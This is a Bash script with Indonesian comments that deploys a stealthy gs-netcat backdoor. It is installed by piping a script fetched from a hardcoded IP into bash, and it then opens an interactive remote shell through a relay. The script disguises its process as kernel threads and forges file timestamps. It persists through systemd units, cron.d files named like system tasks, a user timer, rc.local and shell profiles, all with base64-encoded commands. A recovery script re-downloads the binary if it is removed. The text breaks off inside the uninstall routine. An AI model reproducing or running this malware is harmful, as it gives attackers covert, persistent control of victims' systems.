#!/usr/bin/env bash
# Custom GSocket Deploy Script
# Install  : bash -c "$(curl -fsSL http://128.199.112.4:8088/y)"
# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL http://128.199.112.4:8088/y)"
# Connect  : S=<secret> bash -c "$(curl -fsSL http://128.199.112.4:8088/y)"
# Pre-set  : X=<secret> bash -c "$(curl -fsSL http://128.199.112.4:8088/y)"
#
# Env vars:
#   GS_HOST=        Relay server (default: 128.199.112.4)
#   GS_PORT=        Relay port (default: 8443)
#   GS_UNDO=1       Uninstall
#   X=<secret>      Pre-set secret key
#   S=<secret>      Connect mode (no install)
#   GS_TG_TOKEN=    Telegram bot token
#   GS_TG_CHATID=   Telegram chat ID
#   GS_DISCORD_KEY= Discord webhook key
#   GS_WEBHOOK=     Generic webhook URL

# ──────────────────────────── CONFIG (edit ini) ────────────────────────────
MY_RELAY_HOST="${GS_HOST:-128.199.112.4}"
MY_RELAY_PORT="${GS_PORT:-8443}"
MY_URL_BASE="http://128.199.112.4:8088"
MY_URL_BIN="${MY_URL_BASE}/bin"
MY_URL_DEPLOY="${MY_URL_BASE}/y"
FALLBACK_URL_BIN="https://cdn.gsocket.io/bin"
# ───────────────────────────────────────────────────────────────────────────

BIN_HIDDEN_NAME_DEFAULT="procself"
CONFIG_DIR_NAME="htop"
BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "defunct" "gs-dbus" "gs-db" "gsocket")
CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
# Fallback dirs jika binary utama dihapus (urutan prioritas)
FALLBACK_DIRS_TMPL=(
    "\${HOME}/.local/share/${CONFIG_DIR_NAME}"
    "/dev/shm/.gs_\${UID}"
    "/var/tmp/.gs_\${UID}"
    "/tmp/.gs_\${UID}"
    "\${HOME}/.cache/.gs"
)

proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[slub_flushwq]" "[netns]" "[kaluad]")
PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
NOTE_TAG="#procself-kernel"

[[ -t 1 ]] && {
    CY="\033[1;33m"; CG="\033[1;32m"; CR="\033[1;31m"
    CM="\033[1;35m"; CN="\033[0m"; CW="\033[1;37m"
}

OK_OUT()   { echo -e "${CG}OK${CN}"; }
FAIL_OUT() { echo -e "${CR}FAILED${CN} ${1:-}"; }
SKIP_OUT() { echo -e "${CY}SKIPPED${CN} ${1:-}"; }
WARN()     { echo -e "${CY}WARNING${CN}: $*"; }
ERR()      { echo -e "${CR}ERROR${CN}: $*"; }
errexit()  { ERR "${1:-Unknown error}"; exit 1; }

# ────────────────────────── OS/ARCH DETECTION ──────────────────────────────
detect_osarch() {
    local machine os
    machine="$(uname -m 2>/dev/null)"
    os="$(uname -s 2>/dev/null)"
    case "$os" in
        Linux)
            case "$machine" in
                x86_64)        OSARCH="x86_64-Linux" ;;
                aarch64|arm64) OSARCH="aarch64-Linux" ;;
                armv7*|armv6*) OSARCH="arm-Linux" ;;
                mips*)         OSARCH="mips-Linux" ;;
                i686|i386)     OSARCH="i386-Linux" ;;
                *)             OSARCH="x86_64-Linux" ;;
            esac
            [[ -f /etc/alpine-release ]] || ldd --version 2>&1 | grep -q musl && OSARCH="${machine}-alpine"
            ;;
        Darwin)  [[ "$machine" == "arm64" ]] && OSARCH="arm64-osx" || OSARCH="x86_64-osx" ;;
        FreeBSD) OSARCH="x86_64-freebsd" ;;
        OpenBSD) OSARCH="x86_64-openbsd" ;;
        *)       OSARCH="x86_64-Linux" ;;
    esac
    [[ -n $GS_OSARCH ]] && OSARCH="$GS_OSARCH"
    SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
}

# ──────────────────────── DOWNLOAD HELPER ──────────────────────────────────
init_dl() {
    if command -v curl &>/dev/null; then
        IS_USE_CURL=1
    elif command -v wget &>/dev/null; then
        IS_USE_WGET=1
    else
        errexit "Need curl or wget"
    fi
}

dl_file() {
    local url="$1" out="$2"
    [[ -n $IS_USE_CURL ]] && curl -fsSL --connect-timeout 15 --retry 3 "$url" -o "$out" 2>/dev/null \
                          || wget -qO "$out" "$url" 2>/dev/null
}

dl_stdout() {
    [[ -n $IS_USE_CURL ]] && curl -fsSL "$1" 2>/dev/null || wget -qO- "$1" 2>/dev/null
}

# ──────────────────────── AUTH WRAPPER (disabled — secret-only auth) ───────

# ──────────────────────── RECOVERY SCRIPT ──────────────────────────────────
# Script ini dipanggil oleh cron/profile setiap saat.
# Cek proses, cek binary, recover jika perlu, lalu jalankan gs-netcat.
create_recovery_script() {
    local rcvr="$1"        # path to recovery script
    local bin="$2"         # primary DSTBIN
    local sec="$3"         # secret file
    local auth="$4"        # auth wrapper path
    local proc_name="$5"   # hidden process name

    # Expand fallback dirs with real UID
    local fallback_dirs=""
    for tmpl in "${FALLBACK_DIRS_TMPL[@]}"; do
        local expanded
        expanded="$(eval echo "$tmpl")"
        fallback_dirs+="\"${expanded}\" "
    done

    cat > "$rcvr" <<RCVR
#!/bin/bash
BIN="${bin}"
SEC="${sec}"
AUTH="${auth}"
PROC="${proc_name}"
BNAME="${BIN_HIDDEN_NAME}"
SNAME="${BIN_HIDDEN_NAME}.dat"
ANAME="${BIN_HIDDEN_NAME}.auth"
URL1="${MY_URL_BIN}/${SRC_PKG}"
URL2="${FALLBACK_URL_BIN}/${SRC_PKG}"

FALLBACK_DIRS=(${fallback_dirs})

GS_HOST_VAL="${MY_RELAY_HOST}"
GS_PORT_VAL="${MY_RELAY_PORT}"

# Cek apakah proses sudah berjalan
_is_running() {
    pkill -0 -x "\$BNAME" 2>/dev/null && return 0
    killall -0 "\$BNAME" 2>/dev/null && return 0
    pgrep -x "\$BNAME" &>/dev/null && return 0
    return 1
}

_is_running && exit 0

# Cek binary masih ada dan executable
_find_bin() {
    [[ -x "\$BIN" ]] && return 0

    # Coba cari di fallback dirs
    for d in "\${FALLBACK_DIRS[@]}"; do
        [[ -x "\${d}/\${BNAME}" ]] && { BIN="\${d}/\${BNAME}"; SEC="\${d}/\${SNAME}"; AUTH="\${d}/\${ANAME}"; return 0; }
    done
    return 1
}

_dl() {
    local url="\$1" out="\$2"
    command -v curl &>/dev/null && curl -fsSL --connect-timeout 10 "\$url" -o "\$out" 2>/dev/null && return 0
    command -v wget &>/dev/null && wget -qO "\$out" "\$url" 2>/dev/null && return 0
    return 1
}

_install_to() {
    local d="\$1"
    mkdir -p "\$d" 2>/dev/null || return 1
    # Test exec
    echo '#!/bin/sh' > "\${d}/.t" 2>/dev/null && chmod +x "\${d}/.t" && "\${d}/.t" 2>/dev/null || { rm -f "\${d}/.t"; return 1; }
    rm -f "\${d}/.t"
    # Download
    local tmp="\$(mktemp)" tmpd="\$(mktemp -d)"
    _dl "\$URL1" "\$tmp" || _dl "\$URL2" "\$tmp" || { rm -rf "\$tmp" "\$tmpd"; return 1; }
    tar xfz "\$tmp" -C "\$tmpd" 2>/dev/null || { rm -rf "\$tmp" "\$tmpd"; return 1; }
    [[ ! -f "\${tmpd}/gs-netcat" ]] && { rm -rf "\$tmp" "\$tmpd"; return 1; }
    mv "\${tmpd}/gs-netcat" "\${d}/\${BNAME}" && chmod 700 "\${d}/\${BNAME}" || { rm -rf "\$tmp" "\$tmpd"; return 1; }
    touch -r /etc/ld.so.conf "\${d}/\${BNAME}" 2>/dev/null
    rm -rf "\$tmp" "\$tmpd"
    BIN="\${d}/\${BNAME}"
    # Salin sec dan auth ke lokasi baru jika perlu
    [[ -f "\$SEC" ]] && cp "\$SEC" "\${d}/\${SNAME}" 2>/dev/null && SEC="\${d}/\${SNAME}"
    [[ -f "\$AUTH" ]] && cp "\$AUTH" "\${d}/\${ANAME}" 2>/dev/null && chmod 700 "\${d}/\${ANAME}" && AUTH="\${d}/\${ANAME}"
    return 0
}

# Jika binary tidak ada, recover ke fallback dir
if ! _find_bin; then
    _recovered=0
    for d in "\${FALLBACK_DIRS[@]}"; do
        _install_to "\$d" && { _recovered=1; break; }
    done
    [[ \$_recovered -eq 0 ]] && exit 1
fi

[[ ! -x "\$BIN" ]] && exit 1
[[ ! -f "\$SEC" ]] && exit 1

# Jalankan gs-netcat — secret-only auth, langsung beri shell
GS_HOST="\$GS_HOST_VAL" GS_PORT="\$GS_PORT_VAL" \
    GS_ARGS="-k \${SEC} -ilqD" \
    exec -a "\$PROC" "\$BIN" 2>/dev/null
RCVR

    chmod 700 "$rcvr" 2>/dev/null
    touch -r /etc/ld.so.conf "$rcvr" 2>/dev/null || true
}

# ──────────────────────── TMPDIR SETUP ─────────────────────────────────────
init_tmpdir() {
    local candidates=("/dev/shm" "/tmp" "/var/tmp" "${HOME}/.cache" "$HOME")
    for d in "${candidates[@]}"; do
        [[ -d "$d" ]] || continue
        local t
        t="$(mktemp -d "${d}/.gs_XXXXXXXX" 2>/dev/null)" || continue
        local tf="${t}/.test_$$"
        printf '#!/bin/sh\nexit 0\n' > "$tf" 2>/dev/null
        chmod +x "$tf" 2>/dev/null
        if "$tf" 2>/dev/null; then
            rm -f "$tf"; TMPDIR="$t"; return
        fi
        rm -rf "$t" 2>/dev/null
    done
    TMPDIR="$(mktemp -d)" || errexit "Cannot create tmpdir"
}

cleanup_tmp() { [[ -n $TMPDIR ]] && rm -rf "$TMPDIR" 2>/dev/null; }
trap cleanup_tmp EXIT

# ──────────────────────── INSTALL DIR SELECTION ────────────────────────────
try_dstdir() {
    local d="$1"
    [[ -z $d ]] && return 1
    mkdir -p "$d" 2>/dev/null
    [[ ! -d "$d" ]] && return 1
    local tf="${d}/.test_$$"
    printf '#!/bin/sh\nexit 0\n' > "$tf" 2>/dev/null && chmod +x "$tf" 2>/dev/null || { rm -f "$tf"; return 1; }
    if "$tf" 2>/dev/null; then rm -f "$tf"; DSTDIR="$d"; return 0; fi
    rm -f "$tf"; return 1
}

init_dstdir() {
    [[ -n $GS_DSTDIR ]] && try_dstdir "$GS_DSTDIR" && return
    if [[ $UID -eq 0 ]]; then
        try_dstdir "/usr/local/sbin" && return
        try_dstdir "/usr/sbin"       && return
        try_dstdir "/usr/local/bin"  && return
    fi
    try_dstdir "${HOME}/.config/${CONFIG_DIR_NAME}"       && return
    try_dstdir "${HOME}/.local/share/${CONFIG_DIR_NAME}"  && return
    try_dstdir "/dev/shm/.gs_${UID}"                     && IS_DSTBIN_TMP=1 && return
    try_dstdir "${TMPDIR}"                                && IS_DSTBIN_TMP=1 && return
    errexit "Cannot find a writable+executable directory"
}

# ──────────────────────── BINARY DOWNLOAD ──────────────────────────────────
download_binary() {
    # GS_SRCBIN = path ke binary gs-netcat yang sudah ada (skip download)
    if [[ -n $GS_SRCBIN ]]; then
        if [[ -f "$GS_SRCBIN" ]]; then
            echo -en "Using local binary (GS_SRCBIN)................................."
            cp "$GS_SRCBIN" "${TMPDIR}/gs-netcat" && chmod 700 "${TMPDIR}/gs-netcat" || { FAIL_OUT "copy failed"; errexit; }
            OK_OUT
            return 0
        else
            echo -en "Using local package (GS_SRCBIN)................................"
            (cd "$TMPDIR" && tar xfz "$GS_SRCBIN" 2>/dev/null) || { FAIL_OUT "unpack failed"; errexit; }
            [[ ! -f "${TMPDIR}/gs-netcat" ]] && { FAIL_OUT "binary not in archive"; errexit; }
            OK_OUT
            return 0
        fi
    fi

    echo -en "Downloading ${SRC_PKG}....................................................."
    local out="${TMPDIR}/${SRC_PKG}"
    dl_file "${MY_URL_BIN}/${SRC_PKG}" "$out"
    [[ ! -s "$out" ]] && dl_file "${FALLBACK_URL_BIN}/${SRC_PKG}" "$out"
    [[ ! -s "$out" ]] && { FAIL_OUT "download failed"; errexit; }
    OK_OUT

    echo -en "Unpacking binaries...................................................."
    (cd "$TMPDIR" && tar xfz "$SRC_PKG" 2>/dev/null) || { FAIL_OUT "unpack failed"; errexit; }
    [[ ! -f "${TMPDIR}/gs-netcat" ]] && { FAIL_OUT "binary not in archive"; errexit; }
    OK_OUT
}

install_binary() {
    echo -en "Installing binary....................................................."
    DSTBIN="${DSTDIR}/${BIN_HIDDEN_NAME}"
    mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
    chmod 700 "$DSTBIN"
    touch -r /etc/ld.so.conf "$DSTBIN" 2>/dev/null || true
    OK_OUT
}

test_binary() {
    echo -en "Testing binary........................................................"
    GS_SECRET_GENERATED="$("$DSTBIN" -g 2>/dev/null)"
    [[ $? -ne 0 ]] || [[ -z $GS_SECRET_GENERATED ]] && { FAIL_OUT "binary test failed"; return 1; }
    [[ -z $GS_SECRET ]] && GS_SECRET="$GS_SECRET_GENERATED"
    OK_OUT; return 0
}

# ──────────────────────── SECRET MANAGEMENT ────────────────────────────────
write_secret() {
    local file="$1" secret="$2"
    mkdir -p "$(dirname "$file")" 2>/dev/null
    echo "$secret" > "$file" 2>/dev/null
    chmod 600 "$file" 2>/dev/null
    touch -r /etc/ld.so.conf "$file" 2>/dev/null || true
}

read_secret() { [[ -f "$1" ]] && cat "$1" 2>/dev/null; }

# ──────────────────────── ENV LINE BUILDER ─────────────────────────────────
build_env_line() {
    ENV_LINE=("GS_HOST='${MY_RELAY_HOST}'" "GS_PORT='${MY_RELAY_PORT}'" "")
}

# ──────────────────────── PERSISTENCE: SYSTEMD ─────────────────────────────
install_systemd() {
    local service_dir="" service_file sec_file rcvr_file
    [[ -d "/etc/systemd/system" ]] && service_dir="/etc/systemd/system"
    [[ -d "/lib/systemd/system" ]] && service_dir="/lib/systemd/system"
    [[ -z $service_dir ]] && return 1

    service_file="${service_dir}/${BIN_HIDDEN_NAME}.service"
    sec_file="${service_dir}/${BIN_HIDDEN_NAME}.dat"
    rcvr_file="${service_dir}/${BIN_HIDDEN_NAME}.rc"

    echo -en "Installing systemd service............................................"
    [[ -f "$service_file" ]] && { SKIP_OUT "already installed"; IS_INSTALLED=1; IS_SYSTEMD=1; return 0; }

    write_secret "$sec_file" "$GS_SECRET"
    cp "$RCVR_FILE" "$rcvr_file" 2>/dev/null; chmod 700 "$rcvr_file"
    cp "$AUTH_FILE" "${service_dir}/${BIN_HIDDEN_NAME}.auth" 2>/dev/null
    chmod 700 "${service_dir}/${BIN_HIDDEN_NAME}.auth" 2>/dev/null

    cat > "$service_file" <<EOF
[Unit]
Description=Network time sync
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=5
StartLimitIntervalSec=0
ExecStart=/bin/bash -c "exec ${rcvr_file}"

[Install]
WantedBy=multi-user.target
EOF

    touch -r /etc/ld.so.conf "$service_file" "$sec_file" "$rcvr_file" 2>/dev/null || true

    systemctl enable "${BIN_HIDDEN_NAME}" &>/dev/null && systemctl start "${BIN_HIDDEN_NAME}" &>/dev/null || {
        rm -f "$service_file" "$sec_file" "$rcvr_file"
        FAIL_OUT; return 1
    }
    OK_OUT; IS_INSTALLED=1; IS_SYSTEMD=1; return 0
}

# ──────────────────────── PERSISTENCE: RC.LOCAL ────────────────────────────
install_rclocal() {
    local rcfile="/etc/rc.local"
    [[ ! -f "$rcfile" ]] || [[ ! -x "$rcfile" ]] && return 1
    grep -qF "$BIN_HIDDEN_NAME" "$rcfile" 2>/dev/null && { SKIP_OUT "already in rc.local"; IS_INSTALLED=1; return 0; }

    echo -en "Installing in rc.local................................................"

    local sec_file="/etc/${BIN_HIDDEN_NAME}.dat"
    local rcvr_cp="/etc/${BIN_HIDDEN_NAME}.rc"
    write_secret "$sec_file" "$GS_SECRET"
    cp "$RCVR_FILE" "$rcvr_cp" 2>/dev/null; chmod 700 "$rcvr_cp"

    local line="bash ${rcvr_cp} 2>/dev/null"
    local encoded; encoded="$(echo "$line" | base64 -w0 2>/dev/null || echo "$line" | base64)"

    if grep -q "^exit 0" "$rcfile"; then
        sed -i "/^exit 0/i { echo ${encoded}|base64 -d|bash;} 2>/dev/null $NOTE_TAG" "$rcfile" 2>/dev/null
    else
        echo "{ echo ${encoded}|base64 -d|bash;} 2>/dev/null $NOTE_TAG" >> "$rcfile"
    fi

    touch -r /etc/ld.so.conf "$rcfile" 2>/dev/null || true
    OK_OUT; IS_INSTALLED=1; return 0
}

# ──────────────────────── PERSISTENCE: CRONTAB (base64 encoded) ────────────
install_crontab() {
    echo -en "Installing crontab (encoded).........................................."

    SEC_FILE="${DSTDIR}/${BIN_HIDDEN_NAME}.dat"
    write_secret "$SEC_FILE" "$GS_SECRET"

    local current_cron
    current_cron="$(crontab -l 2>/dev/null)"

    # Tag unik dari DSTDIR — tidak mengandung nama binary
    local cron_id
    cron_id="$(printf '%s%s' "${DSTDIR}" "${GS_SECRET}" | md5sum 2>/dev/null | cut -c1-8 \
             || printf '%s' "${DSTDIR}" | cksum 2>/dev/null | cut -d' ' -f1 \
             || echo "a1b2c3d4")"
    local cron_tag="#${cron_id}"

    # Cek sudah terpasang (tag baru atau nama binary lama)
    echo "$current_cron" | grep -qF "$cron_tag" && { SKIP_OUT "already in crontab"; IS_INSTALLED=1; return 0; }
    echo "$current_cron" | grep -qF "$BIN_HIDDEN_NAME" && { SKIP_OUT "already in crontab (legacy)"; IS_INSTALLED=1; return 0; }

    # Encode command — nama binary tidak terlihat di crontab -l
    local cmd="bash ${RCVR_FILE} 2>/dev/null"
    local encoded; encoded="$(printf '%s' "$cmd" | base64 -w0 2>/dev/null || printf '%s' "$cmd" | base64)"

    local cron_line="* * * * * echo ${encoded}|base64 -d|bash 2>/dev/null ${cron_tag}"

    (echo "$current_cron"; echo "$cron_line") | crontab - 2>/dev/null || { FAIL_OUT; return 1; }

    # Simpan tag untuk uninstall
    echo "$cron_tag" > "$CRON_TAG_FILE" 2>/dev/null
    chmod 600 "$CRON_TAG_FILE" 2>/dev/null
    touch -r /etc/ld.so.conf "$SEC_FILE" "$CRON_TAG_FILE" 2>/dev/null || true
    OK_OUT; IS_INSTALLED=1; return 0
}

# ──────────────────────── PERSISTENCE: /etc/cron.d/ (root) ─────────────────
# Tidak muncul di "crontab -l", terlihat sebagai task sistem
install_cron_d() {
    [[ $UID -ne 0 ]] && return 1
    [[ ! -d /etc/cron.d ]] && return 1

    # Nama file yang meyakinkan — terlihat seperti task sistem
    local cron_d_names=("systemd-update" "network-check" "apt-maintenance" "dbus-monitor" "syslog-rotate")
    local cron_d_name="${cron_d_names[$((RANDOM % ${#cron_d_names[@]}))]}"
    local cron_d_file="/etc/cron.d/${cron_d_name}"
    local cron_user; cron_user="${USER:-$(id -un 2>/dev/null)}"

    # Cek apakah sudah ada (via ref file)
    if [[ -f "$CROND_REF_FILE" ]]; then
        local stored; stored="$(cat "$CROND_REF_FILE" 2>/dev/null)"
        [[ -f "$stored" ]] && { SKIP_OUT "already in cron.d"; IS_INSTALLED=1; return 0; }
    fi

    echo -en "Installing in /etc/cron.d/............................................"

    local cmd="bash ${RCVR_FILE} 2>/dev/null"
    local encoded; encoded="$(printf '%s' "$cmd" | base64 -w0 2>/dev/null || printf '%s' "$cmd" | base64)"

    cat > "$cron_d_file" <<EOF
# System maintenance task
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=""

* * * * * ${cron_user} echo ${encoded}|base64 -d|bash 2>/dev/null
EOF

    chmod 644 "$cron_d_file"
    touch -r /etc/ld.so.conf "$cron_d_file" 2>/dev/null || true

    # Simpan path file untuk uninstall
    echo "$cron_d_file" > "$CROND_REF_FILE" 2>/dev/null
    chmod 600 "$CROND_REF_FILE" 2>/dev/null

    OK_OUT; IS_INSTALLED=1; return 0
}

# ──────────────────────── PERSISTENCE: USER SYSTEMD TIMER ──────────────────
# Tidak muncul di "crontab -l", jalan tanpa login aktif, auto-restart
install_user_systemd_timer() {
    # Butuh systemd --user atau minimal direktori config-nya
    local svc_dir="${HOME}/.config/systemd/user"
    systemctl --user status &>/dev/null || {
        mkdir -p "$svc_dir" 2>/dev/null
        [[ ! -d "$svc_dir" ]] && return 1
    }

    # Nama service yang terlihat seperti komponen sistem
    local svc_names=("session-monitor" "dbus-cfg" "update-notifier" "net-watcher" "audit-helper")
    local svc_name="${svc_names[$((RANDOM % ${#svc_names[@]}))]}"

    # Cek sudah terpasang via ref file
    if [[ -f "$USER_SVC_FILE" ]]; then
        local stored_svc; stored_svc="$(cat "$USER_SVC_FILE" 2>/dev/null)"
        [[ -f "${svc_dir}/${stored_svc}.service" ]] && { SKIP_OUT "already installed (user systemd)"; IS_INSTALLED=1; return 0; }
    fi

    echo -en "Installing user systemd timer........................................."

    mkdir -p "$svc_dir" 2>/dev/null || { FAIL_OUT "cannot create dir"; return 1; }

    cat > "${svc_dir}/${svc_name}.service" <<EOF
[Unit]
Description=Session configuration sync
After=default.target

[Service]
Type=simple
Restart=always
RestartSec=5
StartLimitIntervalSec=0
ExecStart=/bin/bash ${RCVR_FILE}
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF

    cat > "${svc_dir}/${svc_name}.timer" <<EOF
[Unit]
Description=Session sync timer

[Timer]
OnBootSec=30
OnUnitActiveSec=60
Persistent=true

[Install]
WantedBy=timers.target
EOF

    touch -r /etc/ld.so.conf "${svc_dir}/${svc_name}.service" "${svc_dir}/${svc_name}.timer" 2>/dev/null || true

    systemctl --user daemon-reload 2>/dev/null
    # Coba enable timer dulu, fallback ke service langsung
    if systemctl --user enable "${svc_name}.timer" 2>/dev/null && \
       systemctl --user start  "${svc_name}.timer" 2>/dev/null; then
        : # timer berhasil
    elif systemctl --user enable "${svc_name}.service" 2>/dev/null && \
         systemctl --user start  "${svc_name}.service" 2>/dev/null; then
        : # service langsung berhasil
    else
        # systemctl gagal tapi file sudah ada — akan jalan saat next login/boot
        : # biarkan, tidak fatal
    fi

    # Simpan nama untuk uninstall
    echo "$svc_name" > "$USER_SVC_FILE" 2>/dev/null
    chmod 600 "$USER_SVC_FILE" 2>/dev/null
    touch -r /etc/ld.so.conf "$USER_SVC_FILE" 2>/dev/null || true

    OK_OUT; IS_INSTALLED=1; IS_USER_SYSTEMD=1; return 0
}

# ──────────────────────── PERSISTENCE: PROFILE/BASHRC ──────────────────────
install_profile() {
    local rcfile="$1"
    [[ ! -f "$rcfile" ]] && return 1
    grep -qF "$BIN_HIDDEN_NAME" "$rcfile" 2>/dev/null && { IS_INSTALLED=1; return 0; }

    echo -en "Installing in $(basename "$rcfile")................................................"

    SEC_FILE="${DSTDIR}/${BIN_HIDDEN_NAME}.dat"
    write_secret "$SEC_FILE" "$GS_SECRET"

    local line="bash ${RCVR_FILE} 2>/dev/null"
    local encoded; encoded="$(echo "$line" | base64 -w0 2>/dev/null || echo "$line" | base64)"

    echo "{ echo ${encoded}|base64 -d|bash;} 2>/dev/null $NOTE_TAG" >> "$rcfile"
    touch -r /etc/ld.so.conf "$rcfile" 2>/dev/null || true
    OK_OUT; IS_INSTALLED=1; return 0
}

install_user() {
    # 1. User systemd timer — paling stealth, tidak muncul di crontab -l
    install_user_systemd_timer

    # 2. Crontab base64 — command tidak terbaca, redundansi
    install_crontab

    # 3. Profile/bashrc — fallback jika keduanya gagal
    if [[ -z $IS_INSTALLED ]]; then
        local rc_files=()
        [[ -f ~/.bashrc ]]       && rc_files+=("$HOME/.bashrc")
        [[ -f ~/.bash_profile ]] && rc_files+=("$HOME/.bash_profile")
        [[ -f ~/.profile ]]      && rc_files+=("$HOME/.profile")
        [[ ${#rc_files[@]} -eq 0 ]] && rc_files+=("$HOME/.profile")
        for f in "${rc_files[@]}"; do install_profile "$f"; done
    fi
    return 0
}

install_system() {
    [[ $UID -ne 0 ]] && return
    # Semua metode dipasang untuk redundansi maksimum
    install_systemd   # systemd system service
    install_cron_d    # /etc/cron.d/ — tidak muncul di crontab -l user
    install_rclocal   # rc.local fallback
}

# ──────────────────────── UNINSTALL ────────────────────────────────────────
uninstall() {
    echo -e "${CY}Uninstalling...${CN}"

    # Kill process
    local kl_cmd=""
    command -v pkill   &>/dev/null && kl_cmd="pkill -x"
    command -v killall &>/dev/null && kl_cmd="killall"
    for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
        [[ -n $kl_cmd ]] && $kl_cmd "$hn" 2>/dev/null || true
    done

    # Kill tmux session (deploy user biasa)
    if command -v tmux &>/dev/null; then
        for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
            tmux kill-session -t "=$hn" 2>/dev/null || tmux kill-session -t "$hn" 2>/dev/null || true
        done
    fi

    # Stop daemon named instance + hapus pidfile (user biasa)
    local pid_dirs=("${HOME}/.config/${CONFIG_DIR_NAME}" "${HOME}/.local/share/${CONFIG_DIR_NAME}" \
                    "/dev/shm/.gs_${UID}" "/var/tmp/.gs_${UID}" "/tmp/.gs_${UID}" "${HOME}/.cache/.gs")
    [[ -n $DSTDIR ]] && pid_dirs+=("$DSTDIR")
    for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
        if command -v daemon &>/dev/null; then
            for d in "${pid_dirs[@]}"; do
                [[ -d "$d" ]] || continue
                daemon --stop -n "$hn" -P "$d" 2>/dev/null || true
            done
        fi
        for d in "${pid_dirs[@]}"; do
            local pf="${d}/${hn}.pid"
            [[ -f "$pf" ]] || continue
            if command -v start-stop-daemon &>/dev/null; then
                start-stop-daemon --stop --oknodo --pidfile "$pf" 2>/dev/null || true
            else
                local oldpid; oldpid="$(cat "$pf" 2>/dev/null)"
                [[ -n $oldpid ]] && kill "$oldpid" 2>/dev/null || true
            fi
            rm -f "$pf" 2>/dev/null
        done
    done

    # Remove user systemd timer (baca nama dari ref file)
    local user_svc_dirs=("${HOME}/.config/systemd/user")
    local user_svc_ref_candidates=()
    for d in "${HOME}/.config/${CONFIG_DIR_NAME}" "${HOME}/.local/share/${CONFIG_DIR_NAME}"; do
        user_svc_ref_candidates+=("${d}/${BIN_HIDDEN_NAME_DEFAULT}.svc")
    done
    for ref in "${user_svc_ref_candidates[@]}"; do
        [[ ! -f "$ref" ]] && continue
        local stored_svc; stored_svc="$(cat "$ref" 2>/dev/null)"
        [[ -z $stored_svc ]] && continue
        for svc_dir in "${user_svc_dirs[@]}"; do
            systemctl --user stop     "${stored_svc}.timer"   2>/dev/null || true
            systemctl --user stop     "${stored_svc}.service" 2>/dev/null || true
            systemctl --user disable  "${stored_svc}.timer"   2>/dev/null || true
            systemctl --user disable  "${stored_svc}.service" 2>/dev/null || true
            rm -f "${svc_dir}/${stored_svc}.service" "${svc_dir}/${stored_svc}.timer" 2>/dev/null
        done
        systemctl --user daemon-reload 2>/dev/null || true
        rm -f "$ref"
        echo "Removed user systemd timer: ${stored_svc}"
    done
    # Scan juga kemungkinan sisa file .service/.timer dengan nama binary lama
    for svc_dir in "${user_svc_dirs[@]}"; do
        [[ ! -d "$svc_dir" ]] && continue
        for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
            for f in "${svc_dir}/${hn}.service" "${svc_dir}/${hn}.timer"; do
                [[ -f "$f" ]] && {
                    systemctl --user stop    "$hn" 2>/dev/null || true
                    systemctl --user disable "$hn" 2>/dev/null || true
                    rm -f "$f"
                }
            done
        done
    done

    # Remove /etc/cron.d/ entry (baca path dari ref file)
    local crond_ref_candidates=()
    for d in "${HOME}/.config/${CONFIG_DIR_NAME}" "${HOME}/.local/share/${CONFIG_DIR_NAME}"; do
        crond_ref_candidates+=("${d}/${BIN_HIDDEN_NAME_DEFAULT}.crond")
    done
    for ref in "${crond_ref_candidates[@]}"; do
        [[ ! -f "$ref" ]] && continue
        local crond_path; crond_path="$(cat "$ref" 2>/dev/null)"
        [[ -f "$crond_path" ]] && rm -f "$crond_path" && echo "Removed cron.d: ${crond_path}"
        rm -f "$ref"
    done

    # Remove from crontab — handles plaintext (lama) dan base64-encoded (baru)
    local current_cron new_cron="" found_cron=0
    current_cron="$(crontab -l 2>/dev/null)"
    # Kumpulkan semua tag yang mungkin dipakai
    local cron_tags=("$NOTE_TAG" "#defunct-kernel")
    for d in "${HOME}/.config/${CONFIG_DIR_NAME}" "${HOME}/.local/share/${CONFIG_DIR_NAME}"; do
        local ctag_file="${d}/${BIN_HIDDEN_NAME_DEFAULT}.ctag"
        [[ -f "$ctag_file" ]] && cron_tags+=("$(cat "$ctag_file" 2>/dev/null)") && rm -f "$ctag_file"
    done
    while IFS= read -r line; do
        local skip=0
        # Cek nama binary (entry lama tanpa encoding)
        for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
            echo "$line" | grep -qF "$hn" && { skip=1; found_cron=1; break; }
        done
        # Cek cron tag (entry baru base64)
        if [[ $skip -eq 0 ]]; then
            for tag in "${cron_tags[@]}"; do
                [[ -n "$tag" ]] && echo "$line" | grep -qF "$tag" && { skip=1; found_cron=1; break; }
            done
        fi
        [[ $skip -eq 0 ]] && new_cron+="${line}"$'\n'
    done <<< "$current_cron"
    [[ $found_cron -eq 1 ]] && echo "$new_cron" | crontab - 2>/dev/null

    # Remove from profile/bashrc
    for rcfile in ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc; do
        [[ ! -f "$rcfile" ]] && continue
        for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
            grep -qF "$hn" "$rcfile" 2>/dev/null && sed -i "/$hn/d" "$rcfile" 2>/dev/null && echo "Removed from ${rcfile}"
        done
    done

    # Remove from rc.local
    [[ -f /etc/rc.local ]] && for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
        grep -qF "$hn" /etc/rc.local 2>/dev/null && sed -i "/$hn/d" /etc/rc.local 2>/dev/null && echo "Removed from rc.local"
    done

    # Remove systemd service
    for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
        for sd in /etc/systemd/system /lib/systemd/system; do
            [[ -f "${sd}/${hn}.service" ]] || continue
